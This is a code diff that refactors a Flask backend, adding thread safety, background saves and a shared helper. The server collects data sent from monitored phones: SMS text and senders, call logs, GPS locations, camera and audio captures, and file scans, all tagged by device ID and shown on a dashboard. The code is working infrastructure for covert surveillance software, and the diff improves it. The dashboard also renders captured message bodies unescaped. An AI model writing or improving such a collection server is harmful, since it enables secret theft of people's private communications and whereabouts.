@@ -1,31 +1,76 @@
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, jsonify
 from datetime import datetime
 import json
 import os
+import threading
 
 app = Flask(__name__)
 
-# In-memory storage (free Render instances restart occasionally)
+# In-memory storage with thread safety lock
 log_entries = []
+log_lock = threading.Lock()
 
-# Try to load existing data from disk
+# Try to load existing data from disk on startup
+DATA_FILE = '/tmp/captured_data.json'
 try:
-    with open('/tmp/captured_data.json') as f:
-        log_entries = json.load(f)
-except:
-    pass
+    if os.path.exists(DATA_FILE):
+        with open(DATA_FILE, 'r') as f:
+            log_entries = json.load(f)
+except Exception as e:
+    print(f"[-] Warning: Failed to load initial data: {e}")
 
 def save_to_disk():
-    with open('/tmp/captured_data.json', 'w') as f:
-        json.dump(log_entries, f, indent=2)
+    """Schedule disk save asynchronously in a background daemon thread so HTTP response is not blocked."""
+    threading.Thread(target=_do_save_to_disk, daemon=True).start()
+
+def _do_save_to_disk():
+    try:
+        with log_lock:
+            data_to_save = list(log_entries)
+        with open(DATA_FILE, 'w') as f:
+            json.dump(data_to_save, f)
+    except Exception as e:
+        print(f"[-] Error saving data to disk: {e}")
+
+def get_event_category(event_type):
+    """Categorize an event based on its type string."""
+    if not event_type:
+        return 'other'
+    t = str(event_type).lower()
+    if 'sms' in t:
+        return 'sms'
+    elif 'call' in t:
+        return 'call'
+    elif 'location' in t:
+        return 'location'
+    elif 'photo' in t or 'camera' in t or 'capture' in t:
+        return 'camera'
+    elif 'audio' in t or 'record' in t or 'mic' in t:
+        return 'audio'
+    elif 'file' in t or 'scan' in t or 'directory' in t:
+        return 'file'
+    else:
+        return 'other'
+
+CATEGORY_META = {
+    'sms': ('sms', '💬'),
+    'call': ('call', '📞'),
+    'location': ('location', '📍'),
+    'camera': ('camera', '📸'),
+    'audio': ('audio', '🎙️'),
+    'file': ('file', '📁'),
+    'other': ('other', '📋')
+}
 
 @app.route('/api/log', methods=['GET'])
 def get_logs():
-    # Support category filtering via query parameter: /api/log?category=sms
     category = request.args.get('category', '').lower()
     
+    with log_lock:
+        entries = list(log_entries)
+    
     if category:
-        filtered = [e for e in log_entries if category in e.get('type', '').lower()]
+        filtered = [e for e in entries if category in str(e.get('type', '')).lower()]
         return jsonify({
             'total_events': len(filtered),
             'category': category,
@@ -33,155 +78,110 @@ def get_logs():
         })
     
     return jsonify({
-        'total_events': len(log_entries),
-        'events': log_entries
+        'total_events': len(entries),
+        'events': entries
     })
 
 @app.route('/api/stats', methods=['GET'])
 def get_stats():
     """Return event counts by category."""
     stats = {}
-    for event in log_entries:
-        event_type = event.get('type', 'unknown')
-        # Extract main category
-        if 'sms' in event_type.lower():
-            category = 'sms'
-        elif 'call' in event_type.lower():
-            category = 'call'
-        elif 'location' in event_type.lower():
-            category = 'location'
-        elif 'photo' in event_type.lower() or 'camera' in event_type.lower() or 'capture' in event_type.lower():
-            category = 'camera'
-        elif 'audio' in event_type.lower() or 'record' in event_type.lower() or 'mic' in event_type.lower():
-            category = 'audio'
-        elif 'file' in event_type.lower() or 'scan' in event_type.lower() or 'directory' in event_type.lower():
-            category = 'file'
-        else:
-            category = 'other'
+    with log_lock:
+        entries = list(log_entries)
         
+    for event in entries:
+        category = get_event_category(event.get('type', ''))
         stats[category] = stats.get(category, 0) + 1
     
     return jsonify({
-        'total_events': len(log_entries),
+        'total_events': len(entries),
         'categories': stats
     })
 
 @app.route('/api/log', methods=['POST'])
 def post_log():
     try:
-        data = request.get_json()
+        data = request.get_json(force=True, silent=True) or {}
         data['server_received_at'] = datetime.now().isoformat()
-        log_entries.append(data)
         
-        # Cap at 1000 events
-        if len(log_entries) > 1000:
-            log_entries.pop(0)
+        with log_lock:
+            log_entries.append(data)
+            # Cap at 1000 events
+            if len(log_entries) > 1000:
+                log_entries.pop(0)
+            total = len(log_entries)
         
+        # Async non-blocking save
         save_to_disk()
-        print(f"[+] Received: {json.dumps(data, indent=2)}")
         
-        return jsonify({'status': 'ok', 'total_events': len(log_entries)})
+        event_type = data.get('type', 'unknown')
+        device_id = data.get('device_id', 'unknown')
+        print(f"[+] Received [{event_type}] from {device_id}")
+        
+        return jsonify({'status': 'ok', 'total_events': total})
     except Exception as e:
         return jsonify({'error': str(e)}), 400
 
 @app.route('/')
 def dashboard():
-    # Get the category filter from query parameter
     active_category = request.args.get('category', 'all').lower()
     
-    # Get stats for the nav bar
-    stats = {}
-    for event in log_entries:
-        event_type = event.get('type', 'unknown')
-        if 'sms' in event_type.lower():
-            category = 'sms'
-        elif 'call' in event_type.lower():
-            category = 'call'
-        elif 'location' in event_type.lower():
-            category = 'location'
-        elif 'photo' in event_type.lower() or 'camera' in event_type.lower() or 'capture' in event_type.lower():
-            category = 'camera'
-        elif 'audio' in event_type.lower() or 'record' in event_type.lower() or 'mic' in event_type.lower():
-            category = 'audio'
-        elif 'file' in event_type.lower() or 'scan' in event_type.lower() or 'directory' in event_type.lower():
-            category = 'file'
-        else:
-            category = 'other'
-        stats[category] = stats.get(category, 0) + 1
+    with log_lock:
+        entries = list(log_entries)
     
-    # Build events HTML
-    events_html = ''
+    # Calculate stats for nav bar
+    stats = {}
+    for event in entries:
+        cat = get_event_category(event.get('type', ''))
+        stats[cat] = stats.get(cat, 0) + 1
+    
+    # Build events HTML efficiently using list accumulation
+    events_html_list = []
     displayed_count = 0
     
-    for event in reversed(log_entries):
-        event_type = event.get('type', 'unknown')
+    for event in reversed(entries):
+        event_type = str(event.get('type', 'unknown'))
+        category = get_event_category(event_type)
+        css_class, icon = CATEGORY_META.get(category, ('other', '📋'))
         
-        # Determine category
-        if 'sms' in event_type.lower():
-            css_class = 'sms'
-            category = 'sms'
-            icon = '💬'
-        elif 'call' in event_type.lower():
-            css_class = 'call'
-            category = 'call'
-            icon = '📞'
-        elif 'location' in event_type.lower():
-            css_class = 'location'
-            category = 'location'
-            icon = '📍'
-        elif 'photo' in event_type.lower() or 'camera' in event_type.lower() or 'capture' in event_type.lower():
-            css_class = 'camera'
-            category = 'camera'
-            icon = '📸'
-        elif 'audio' in event_type.lower() or 'record' in event_type.lower() or 'mic' in event_type.lower():
-            css_class = 'audio'
-            category = 'audio'
-            icon = '🎙️'
-        elif 'file' in event_type.lower() or 'scan' in event_type.lower() or 'directory' in event_type.lower():
-            css_class = 'file'
-            category = 'file'
-            icon = '📁'
-        else:
-            css_class = 'other'
-            category = 'other'
-            icon = '📋'
-        
-        # Skip if filtering by category
+        # Filter check
         if active_category != 'all' and category != active_category:
             continue
         
         displayed_count += 1
         
-        # Format the data for display
         event_data = event.get('data', {})
         device_id = event.get('device_id', 'unknown')
         timestamp = event.get('timestamp', '')
         server_time = event.get('server_received_at', '')
         
-        # Build a readable summary based on event type
-        summary = ''
-        if 'sms' in event_type.lower():
+        # Serialize raw JSON once per event
+        raw_json_str = json.dumps(event_data, indent=2)
+        
+        # Build summary
+        t_lower = event_type.lower()
+        if 'sms' in t_lower:
             summary = f"From: {event_data.get('sender', event_data.get('address', 'Unknown'))}<br>Message: {event_data.get('body', 'N/A')}"
-        elif 'call' in event_type.lower():
+        elif 'call' in t_lower:
             summary = f"Number: {event_data.get('number', 'Unknown')}<br>Duration: {event_data.get('duration_seconds', event_data.get('duration', 'N/A'))}s"
-        elif 'location' in event_type.lower():
+        elif 'location' in t_lower:
             lat = event_data.get('latitude', '?')
             lon = event_data.get('longitude', '?')
             summary = f"Lat: {lat}, Lon: {lon}<br>Accuracy: {event_data.get('accuracy_meters', 'N/A')}m"
-        elif 'photo' in event_type.lower() or 'camera' in event_type.lower() or 'capture' in event_type.lower():
+        elif 'photo' in t_lower or 'camera' in t_lower or 'capture' in t_lower:
             file_name = event_data.get('file_name', 'unknown')
             file_size = event_data.get('file_size', 0)
             summary = f"File: {file_name}<br>Size: {format_size(file_size)}"
-        elif 'audio' in event_type.lower() or 'record' in event_type.lower():
+        elif 'audio' in t_lower or 'record' in t_lower:
             file_name = event_data.get('file_name', 'unknown')
             file_size = event_data.get('file_size', 0)
             summary = f"File: {file_name}<br>Size: {format_size(file_size)}"
-        elif 'file' in event_type.lower() or 'scan' in event_type.lower() or 'directory' in event_type.lower():
+        elif 'file' in t_lower or 'scan' in t_lower or 'directory' in t_lower:
             summary = f"Path: {event_data.get('directory_path', event_data.get('path', 'Unknown'))}<br>Files: {event_data.get('file_count', 'N/A')}"
         else:
-            summary = json.dumps(event_data, indent=2)
+            summary = raw_json_str
         
-        events_html += f'''
+        events_html_list.append(f'''
         <div class="event {css_class}">
             <div class="event-header">
                 <span class="event-icon">{icon}</span>
@@ -192,11 +192,12 @@ def dashboard():
             <div class="summary">{summary}</div>
             <details class="raw-data">
                 <summary>📄 Raw JSON</summary>
-                <pre>{json.dumps(event_data, indent=2)}</pre>
+                <pre>{raw_json_str}</pre>
             </details>
-        </div>'''
+        </div>''')
     
-    # Build category navigation
+    events_html = "".join(events_html_list)
+    
     categories = [
         ('all', '📊 All', sum(stats.values())),
         ('sms', '💬 SMS', stats.get('sms', 0)),
@@ -208,10 +209,11 @@ def dashboard():
         ('other', '📋 Other', stats.get('other', 0)),
     ]
     
-    nav_html = ''
+    nav_html_list = []
     for cat_id, cat_label, count in categories:
         active_class = 'active' if active_category == cat_id else ''
-        nav_html += f'<a href="/?category={cat_id}" class="nav-item {active_class}">{cat_label} <span class="count">{count}</span></a>\n'
+        nav_html_list.append(f'<a href="/?category={cat_id}" class="nav-item {active_class}">{cat_label} <span class="count">{count}</span></a>\n')
+    nav_html = "".join(nav_html_list)
     
     html = f'''<!DOCTYPE html>
 <html>
